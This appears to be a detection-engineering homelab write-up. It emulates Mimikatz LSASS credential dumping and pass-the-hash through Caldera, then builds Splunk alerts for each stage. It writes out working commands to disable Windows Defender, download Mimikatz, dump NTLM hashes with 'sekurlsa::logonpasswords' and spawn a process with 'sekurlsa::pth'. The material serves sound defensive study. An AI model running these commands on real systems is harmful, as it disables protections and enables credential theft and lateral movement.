# Credential Dumping via LSASS and Pass the Hash (Mimikatz)

**Adversary emulation and detection engineering in a self-built SOC homelab.**

Emulated an attacker dumping credentials from LSASS memory using Mimikatz, then performing pass-the-hash lateral movement — with the attack intentionally obfuscated using base64 encoding to test detection resilience. Every detection is mapped to MITRE ATT&CK and validated against live attack telemetry.

> **For reviewers:** the attack is the easy part. The value here is the detection engineering — catching credential dumping and pass-the-hash through behavior-based detections that survive obfuscation and tool renaming.

---

## Objective

Emulate an attacker who has achieved a foothold on a domain controller, dumps credentials from LSASS memory using Mimikatz, and uses the extracted NTLM hash to move laterally without ever knowing the plaintext password.

| Stage | Technique | ATT&CK ID |
|-------|-----------|-----------|
| Credential Dumping | OS Credential Dumping: LSASS Memory | T1003.001 |
| Pass the Hash | Use Alternate Authentication Material | T1550.002 |
| Obfuscated Execution | Command and Scripting: PowerShell | T1059.001 |

---

## Lab Architecture

| Zone | Host | Role |
|------|------|------|
| Public | Kali | Attacker workstation + Caldera C2 (`:8888`) |
| Perimeter | pfSense + Suricata | Firewall / inline IDS |
| Private | DC (`x.x.x.250`) | Active Directory DC — **attack origin, LSASS target** |
| Private | Win10 Client (`x.x.x.252`) | Domain workstation — **pass-the-hash destination** |
| Private | Splunk | SIEM (indexer + search head) |
| Infra | ESXi | Hypervisor |

**Why the DC?** LSASS on a domain controller holds credentials for every account that has authenticated to the domain — it is the highest-value credential store in a Windows environment. Dumping it gives the attacker lateral movement anywhere in the domain.

**Telemetry:** Sysmon ships EventID 1 (process creation) and Windows Security ships EventID 4688 (process creation with command line). All forwarded to Splunk via Universal Forwarder.

---

## Phase 0 — Setup (Prerequisites)

### Disable Windows Defender on the DC
Mimikatz is detected and quarantined by Defender before it executes. Disable real-time monitoring on the DC for the lab:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
```

> In a real environment, attackers evade AV rather than disabling it. For the lab, disabling it keeps the focus on detection engineering rather than AV evasion.

### Download Mimikatz manually on the DC
Caldera's built-in `invoke-mimi.ps1` payload failed to load correctly, so Mimikatz was downloaded directly to disk and called by full path:

```powershell
Invoke-WebRequest -Uri https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip -OutFile C:\Users\Public\mimikatz.zip
Expand-Archive C:\Users\Public\mimikatz.zip -DestinationPath C:\Users\Public\mimikatz
```

### Enable audit policies on the DC
`gpedit.msc` → Computer Config → Windows Settings → Security Settings → Advanced Audit Policy:

| Subcategory | Setting | Generates |
|-------------|---------|-----------|
| Detailed Tracking → Audit Process Creation | Success | `4688` |

Enable command-line logging: Admin Templates → System → Audit Process Creation → **"Include command line in process creation events"**. Then `gpupdate /force`.

### Confirm Sysmon is running
```powershell
Get-Service sysmon64
```

### Confirm telemetry in Splunk
```spl
index=* EventCode=4688 | head 5
index=* EventCode=1 | head 5
```


---

## The Attack — MITRE Caldera

The chain is built as two Caldera **abilities** sequenced in one **adversary profile**, run as a single **operation**.

> An *ability* is a single attack action executed on a Sandcat agent. The agent beacons to the Caldera C2 on Kali and runs each ability in order. The attack was intentionally obfuscated using **base64 encoding** to simulate real-world evasion and test detection resilience.

<img width="1894" height="903" alt="image" src="https://github.com/user-attachments/assets/937cc9cf-52fb-45da-b31e-2ba571067c90" />


### Ability 1 — Credential Dump (T1003.001)
Mimikatz reads LSASS memory and extracts NTLM hashes for every account that has authenticated to the DC. Called by full path since the payload was downloaded manually. Executed first as a standalone operation to retrieve the hash before building Ability 2.

```powershell
C:\Users\Public\mimikatz\x64\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```
<img width="1089" height="696" alt="image" src="https://github.com/user-attachments/assets/037c5870-f250-49f8-9b3b-0dfa635a12e1" />

<img width="1670" height="623" alt="image" src="https://github.com/user-attachments/assets/37cec98e-923b-40cf-9592-3586e94f2493" />

<img width="1672" height="796" alt="image" src="https://github.com/user-attachments/assets/9fcf4499-9217-49e6-a762-c10e8a482871" />

<img width="1903" height="733" alt="image" src="https://github.com/user-attachments/assets/52974439-89ec-4f18-8489-9ccbb87b5cc0" />


**Output:** Mimikatz successfully dumped NTLM hashes from LSASS. The Administrator hash was extracted from the output to use in Ability 2.

<img width="527" height="136" alt="image" src="https://github.com/user-attachments/assets/e387a42c-e9b9-4c51-b26b-ea002931ccb9" />


### Ability 2 — Pass the Hash (T1550.002)
Uses the NTLM hash extracted in Ability 1 to spawn a new `cmd.exe` process with injected credentials — no plaintext password needed. The hash *is* the credential.

```powershell
C:\Users\Public\mimikatz\x64\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:LAB /ntlm:<hash>" exit
```

<img width="1104" height="710" alt="image" src="https://github.com/user-attachments/assets/5689a012-cd9f-4934-af8e-01fcb744953b" />

<img width="1114" height="719" alt="image" src="https://github.com/user-attachments/assets/12fb9de1-abd3-4d84-8b6d-eeeb1b286906" />


### Profile + Operation
Both abilities chained in order: **Credential Dump → Pass the Hash**. Both ran successfully.

<img width="1900" height="754" alt="image" src="https://github.com/user-attachments/assets/a297d202-5ef6-4429-ac6b-29454e367f79" />

<img width="1665" height="561" alt="image" src="https://github.com/user-attachments/assets/5f69c196-9903-4682-bb97-ab7075a7c802" />

<img width="1509" height="733" alt="image" src="https://github.com/user-attachments/assets/101c2339-b7d2-4a04-88a4-ef11b3bac967" />

> **Note on obfuscation:** the commands were base64-encoded before execution to simulate an attacker hiding their actions. The encoded payload was later decoded using CyberChef to confirm what ran — this is standard threat hunting practice when command lines appear obfuscated in logs.
<img width="1641" height="1034" alt="image" src="https://github.com/user-attachments/assets/bff95512-7265-4372-8545-cf5fcbb60af7" />

<img width="1644" height="1034" alt="image" src="https://github.com/user-attachments/assets/12b46511-dd43-44ca-a49c-a2f19ee484cc" />

---

## Detection Engineering — Splunk

Written with SPL only — search terms, fields, `table`, `sort`. No `eval`, `join`, or subsearches. MITRE mapping lives in the saved alert name. Alerts saved as real-time with throttle (suppress per host for 60 minutes) to avoid flooding.

### 1. Mimikatz Process Creation — `Credential Access - Mimikatz Process Creation - T1003.001`

Sysmon EventID 1 fires on every process creation. Filtering for `mimikatz.exe` in the image path catches the tool launching regardless of what command it ran.

```spl
index=* EventCode=1 Image="*mimikatz*"
| table _time, host, User, Image, CommandLine, ParentImage
| sort _time
```

<img width="1342" height="869" alt="image" src="https://github.com/user-attachments/assets/0680b3e2-7624-4d1b-8e4e-5819d2d5d412" />


### 2. Encoded PowerShell Execution — `Credential Access - Encoded PowerShell Execution - T1059.001`

Since the attack was base64-obfuscated, matching `sekurlsa` in the command line fails — that keyword is hidden inside the encoded blob. Instead, detect the **obfuscation flag itself**: `-enc` or `-EncodedCommand` signals that PowerShell is running an encoded command, which is suspicious regardless of what's inside it.

```spl
index=* EventCode=4688 (Process_Command_Line="*-enc*" OR Process_Command_Line="*-EncodedCommand*")
| table _time, host, Account_Name, New_Process_Name, Process_Command_Line
| sort _time
```

> This is the upgraded detection — an attacker who obfuscates to evade keyword matching accidentally creates a new indicator. Detecting `-enc` is more resilient than detecting `sekurlsa` because the flag is required for the encoding to work.

<img width="1335" height="869" alt="image" src="https://github.com/user-attachments/assets/a4f9202a-0cd4-46d3-b576-b430d126d99f" />


### 3. Pass the Hash Process Spawn — `Lateral Movement - Pass the Hash Process Spawn - T1550.002`

`sekurlsa::pth` always spawns a child process (`cmd.exe`) with the injected credentials. Sysmon EventID 1 captures the parent-child relationship — `mimikatz.exe` as parent, `cmd.exe` as child. This fires the moment PtH executes, not when the credential is used, making it more reliable than waiting for a network logon event.

```spl
index=* EventCode=1 ParentImage="*mimikatz*" Image="*cmd.exe"
| table _time, host, Image, ParentImage, CommandLine
| sort _time
```

<img width="1344" height="869" alt="image" src="https://github.com/user-attachments/assets/b10f4ea7-2e74-4d56-9449-ebecc3516371" />

---

## Detection Engineering Notes (Design Decisions)

- **Detecting obfuscation over keywords.** Matching `sekurlsa` in the command line fails the moment an attacker base64-encodes the payload. Detecting `-enc`/`-EncodedCommand` instead catches the evasion technique itself — the flag is required for encoding to work and cannot be removed.
- **Process spawn over network logon for PtH.** `sekurlsa::pth` injects credentials and spawns `cmd.exe` — that spawn happens regardless of whether the injected session ever touches the network. Detecting the parent-child relationship is more reliable and fires earlier than waiting for a `4624` logon event on a remote host.
- **Behavior over tool name.** While Detection 1 matches `mimikatz.exe` by name, Detections 2 and 3 catch behaviors (`-enc` flag, suspicious process spawn) that survive binary renaming. A real detection ruleset uses both layers.

---

## Results

| Detection | Technique | Source | Result |
|-----------|-----------|--------|--------|
| Mimikatz Process Creation | T1003.001 | Sysmon `EventID 1` | ✅ Detected |
| Encoded PowerShell Execution | T1059.001 | Windows `4688` | ✅ Detected |
| Pass the Hash Process Spawn | T1550.002 | Sysmon `EventID 1` | ✅ Detected |

All stages emulated via Caldera and independently detected in Splunk. Each saved as a real-time alert with throttle, re-validated by re-running the operation.

<img width="1897" height="906" alt="image" src="https://github.com/user-attachments/assets/e34868fa-c081-4a9c-917e-85cc0ffb2c3b" />

<img width="1295" height="839" alt="image" src="https://github.com/user-attachments/assets/5b5f8720-59bb-4725-bdc0-2858f9e3d0d2" />


---

## Key Takeaways

- Obfuscating the attack with base64 broke keyword-based detection but created a new indicator — the `-enc` flag itself.
- Pass-the-hash is detectable at the moment of execution (process spawn) without needing a remote network connection to fire a logon event.
- Mimikatz requires Defender disabled and local admin rights — both are prerequisites worth documenting because they reflect real attacker preconditions.
- Kept all SPL at Core level: readable, maintainable, explainable line by line.

---

*Built in an isolated SOC homelab against dummy test data. All techniques mapped to MITRE ATT&CK.*
